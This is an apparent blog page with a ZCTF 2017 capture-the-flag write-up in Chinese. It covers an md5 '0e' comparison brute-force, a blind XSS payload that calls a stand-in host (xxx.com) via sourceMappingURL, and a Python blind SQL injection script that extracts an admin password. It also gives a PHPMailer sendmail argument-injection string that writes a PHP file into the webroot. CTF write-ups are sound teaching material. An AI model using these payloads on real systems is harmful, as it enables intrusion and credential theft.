@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      ZCTF 2017 writeup | HeartSky&#39;s blog 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="HeartSky">
+    
+    
+
+    <meta name="description" content="Webweb100 - 100 简单点http://58.213.63.30:10006/866c1f6d2294a19105366ffdae702584/  打开后只显示了 ha?，没有任何功能。猜测是有备份文件泄露，试了下 .index.php.swp，得到了源码1234567891011&amp;lt;?php$flag = $_GET[&apos;flag&apos;];if ($flag != &apos;15562&apos;) &amp;">
+<meta name="keywords" content="writeup,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ZCTF 2017 writeup | HeartSky&#39;s blog">
+<meta property="og:url" content="http://heartsky.info/2017/03/02/ZCTF-2017-writeup/index.html">
+<meta property="og:site_name" content="HeartSky&#39;s blog">
+<meta property="og:description" content="Webweb100 - 100 简单点http://58.213.63.30:10006/866c1f6d2294a19105366ffdae702584/  打开后只显示了 ha?，没有任何功能。猜测是有备份文件泄露，试了下 .index.php.swp，得到了源码1234567891011&amp;lt;?php$flag = $_GET[&apos;flag&apos;];if ($flag != &apos;15562&apos;) &amp;">
+<meta property="og:updated_time" content="2017-11-15T06:18:36.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ZCTF 2017 writeup | HeartSky&#39;s blog">
+<meta name="twitter:description" content="Webweb100 - 100 简单点http://58.213.63.30:10006/866c1f6d2294a19105366ffdae702584/  打开后只显示了 ha?，没有任何功能。猜测是有备份文件泄露，试了下 .index.php.swp，得到了源码1234567891011&amp;lt;?php$flag = $_GET[&apos;flag&apos;];if ($flag != &apos;15562&apos;) &amp;">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">HeartSky&#39;s blog</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          在渗透之路上渐行渐远
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/friends" title="" class="">友链</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">ZCTF 2017 writeup</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2017-03-02" class="post-meta__date date">2017-03-02</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/CTF/">CTF</a>, <a class="tags-link" href="/tags/writeup/">writeup</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web100-100"><a href="#web100-100" class="headerlink" title="web100 - 100"></a>web100 - 100</h3><blockquote>
+<p>简单点<br><a href="http://58.213.63.30:10006/866c1f6d2294a19105366ffdae702584/" target="_blank" rel="external">http://58.213.63.30:10006/866c1f6d2294a19105366ffdae702584/</a></p>
+</blockquote>
+<p>打开后只显示了 ha?，没有任何功能。猜测是有备份文件泄露，试了下 <code>.index.php.swp</code>，得到了源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = $_GET[<span class="string">'flag'</span>];</span><br><span class="line"><span class="keyword">if</span> ($flag != <span class="string">'15562'</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (strstr($flag, <span class="string">'zctf'</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (substr(md5($flag),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'ZCTF&#123;#########&#125;'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'ha?'</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>简单的 md5 爆破，因为 <code>substr(md5(&#39;15562&#39;),8,16)</code> 是以 0e 开头的，所以只要保证我们的中间的这几位 md5 值是 0e 开头，后面的都是数字即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000000</span>):</span><br><span class="line">    s = <span class="string">'zctf'</span> + str(i)</span><br><span class="line">    md5 = hashlib.md5(s).hexdigest()</span><br><span class="line">    h = md5[<span class="number">8</span>:<span class="number">24</span>]</span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> md5[<span class="number">8</span>:<span class="number">10</span>] == <span class="string">'0e'</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> md5[<span class="number">10</span>:<span class="number">24</span>]:</span><br><span class="line">            <span class="keyword">if</span> j.isalpha():</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">print</span> s</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="Find-my-eyes-100"><a href="#Find-my-eyes-100" class="headerlink" title="Find my eyes - 100"></a>Find my eyes - 100</h3><p>打开后是一个不知道什么 cms 的站，发表评论什么的功能都是假的，只有 contact.php 可以，然后结合响应头中有 CSP 头<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy:</span><br><span class="line">default-src &apos;self&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos;;</span><br></pre></td></tr></table></figure></p>
+<p>猜测可能是盲打 XSS<br>这个表单有 Name Email Team textarea 字段，刚开始一直在尝试 textarea 字段，发现基本上关键字都被过滤了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">eval</span><br><span class="line">document</span><br><span class="line">location</span><br><span class="line">href</span><br><span class="line">window</span><br><span class="line">src</span><br><span class="line">svg</span><br><span class="line">img</span><br><span class="line">&apos;</span><br><span class="line">&quot;</span><br><span class="line">括号</span><br></pre></td></tr></table></figure></p>
+<p>没找到方法绕过，又去看 Name 和 Team 字段，虽然没有这些过滤，但怎么也收不到请求，猜测后台只获取了 textarea 字段的值并显示了出来，那么 payload 还是在 textarea 字段里，最后找到了一个长短短的 payload<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">//@ sourceMappingURL=http://xxx.com</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>PS: <code>//@ sourceMappingURL=xxx.map</code> 是用来启用 Source map 的，而 Source map 是用来代码出错时显示原始代码而不是转换(压缩、多个文件合并、其他语言编译成 JS)后的代码，方便开发者调试<br>参考链接： <a href="http://www.ruanyifeng.com/blog/2013/01/javascript_source_map.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2013/01/javascript_source_map.html</a></p>
+<p>PS2: <code>//@ sourceMappingURL=xxx.map</code> 已弃用，代替为 <code>//# sourceMappingURL=xxx.map</code></p>
+<h3 id="easy-apk-200"><a href="#easy-apk-200" class="headerlink" title="easy apk - 200"></a>easy apk - 200</h3><p>下载后是一个 APK，逆向队友反汇编出客户端源码，是请求了 / 和 /mail.php 这两个地址，猜测是要先登录再发送邮件什么的<br>手机抓包看到登录的用户名和密码进行了加密，然后队友给了加密算法，开始尝试都是返回 <code>{&quot;result&quot;:&quot;no&quot;,&quot;username&quot;:&quot;&quot;}</code>，试了下 sql 注入，结果发现返回了 <code>{&quot;result&quot;:&quot;hacked&quot;,&quot;username&quot;:&quot;&quot;}</code>，说明是有过滤的，那么肯定就是 sql 注入获取 admin 的密码然后再登录 mail.php进行下一步<br>测试得到过滤了这些<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">)</span><br><span class="line">&amp;</span><br><span class="line">|</span><br><span class="line">union select</span><br><span class="line">from</span><br><span class="line">password</span><br></pre></td></tr></table></figure></p>
+<p>值得注意的是 union 和 select 单独出现都是可以的，但一起出现就 GG 了，起初用 /**/ 替换之间的空格发现还是被过滤，就以为是 union select 不能同时出现的，是绕不过的，想要盲注，可是没有括号想了很久都没想到，因为是函数的话都要用到括号。明天起来发现土师傅绕过了union select<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union distinct select</span><br></pre></td></tr></table></figure></p>
+<p>这样就是可以的，那么后台的过滤应该是 union 和 select 之间没有字母数字的话就会被拦截。<br>PS：加上 distinct 和不加是对查询结果没有影响的，都会对结果去重，而另一个 <code>union all select</code> 则是不去重，显示所有结果<br>然后我们的目标就是获得 admin 的密码进行登陆了，因为 password 被拦了，所以这里只能盲注。利用 order by 的特性，如果我们根据 password 那一列对数据进行排序，如果我们选取的字符大于 password 中对应的字符，并且是在降序排序的情况下，第二条查询结果就会显示<br>写个脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># py2.7</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(name)</span>:</span> </span><br><span class="line">    key = <span class="string">"1470"</span>*<span class="number">100</span></span><br><span class="line">    name =  <span class="string">''</span>.join(reversed(list(name)))</span><br><span class="line">    tmp=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(name)):</span><br><span class="line">        tmp.append(hex(ord(name[i])^ord(key[i]))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    enc = <span class="string">''</span>.join(tmp)</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPassword</span><span class="params">()</span>:</span></span><br><span class="line">    password = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            name = <span class="string">"admin' union distinct select 1,'test','"</span> + password + chr(j) + <span class="string">"' order by 3 desc#"</span></span><br><span class="line">            enc = encrypt(name)</span><br><span class="line">            payload = &#123;<span class="string">'username'</span>:enc, <span class="string">'password'</span>:<span class="number">111</span>&#125;</span><br><span class="line">            r = requests.post(<span class="string">'http://58.213.63.30:10005'</span>, data=payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'test'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                password += chr(j<span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">print</span> password</span><br><span class="line">                <span class="keyword">break</span>           </span><br><span class="line"></span><br><span class="line"><span class="comment"># print encrypt("admin' union distinct select 0,2,3 order by 1 asc#")</span></span><br><span class="line">getPassword()</span><br></pre></td></tr></table></figure></p>
+<p>得到密码 5AF1AB27B1BE8BB8E39BDF98CD2CFCE4<br>md5 查一下为 CleverBoy123<br>然后进行加密就可以登陆了，这也就解释了前面为什么<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=1&apos;||1#</span><br></pre></td></tr></table></figure></p>
+<p>返回的是 <code>{&quot;result&quot;:&quot;no&quot;,&quot;username&quot;:&quot;admin&quot;}</code> 了，第一次查询 where 条件是 username 和 password 的联合，绕过，为 admin，但后面又对密码的 md5 值进行了检测，所以 result 为 no</p>
+<p>第二步是发送邮件，联想到之前 PHPMailer 的 CVE，利用 sendmail 写入 log 的方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a( -X/var/www/html/upload/test.php -OQueueDirectory=/tmp )@qq.com</span><br></pre></td></tr></table></figure></p>
+<p>get flag</p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Russian-zips-300"><a href="#Russian-zips-300" class="headerlink" title="Russian zips - 300"></a>Russian zips - 300</h3><p>zip 压缩包伪加密，更改第八位的 01 为 00 即可解密(Linux 直接 binwalk -e 即可)，然后得到一个 .mca 文件，是 mc 的地图文件， 下载个 mc 或者 地图编辑器什么的都可以<br>不懂为啥300分</p>
+<h3 id="Whisper-400"><a href="#Whisper-400" class="headerlink" title="Whisper - 400"></a>Whisper - 400</h3><p>下载后有这些文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hint1.png</span><br><span class="line">start here.exe</span><br><span class="line">flag.rar</span><br></pre></td></tr></table></figure></p>
+<p>flag 所在的压缩包被加密过了，先看下 hint1.png，用 stegsolve 可以看到提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ron，Adi，Leonard，and don&apos;t forget to check this file carefully</span><br></pre></td></tr></table></figure></p>
+<p>搜了下是 RSA 的三个作者，那么应该是什么东西里有 RSA<br>然后逆向的队友分析了下 start here.exe，得到 n=2344088051，e=65537，然后还有 44 个密文，解密得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint 2: a hidden RAR file, encoded in base64</span><br></pre></td></tr></table></figure></p>
+<p>然后再根据提示1里的仔细检查这个文件，可以看到图片后有一大串 base64，base64 decode 后分离文件<br>然后用 bz2 module 解密就能拿到 flag 了</p>
+
+  </section>
+
+  
+  
+</article>
+
+
+            <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<footer class="footer">
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+    <span class="footer__copyright">&copy; 2016-2017. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a> | <a href="https://coding.net/u/HeartSky/p/HeartSky/git/pages">Hosted by Coding Pages</a></span>  
+</footer>
+
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['$','$'],['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    <script src="http://s11.cnzz.com/z_stat.php?id=1259147269&web_id=1259147269" language="JavaScript"></script>
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
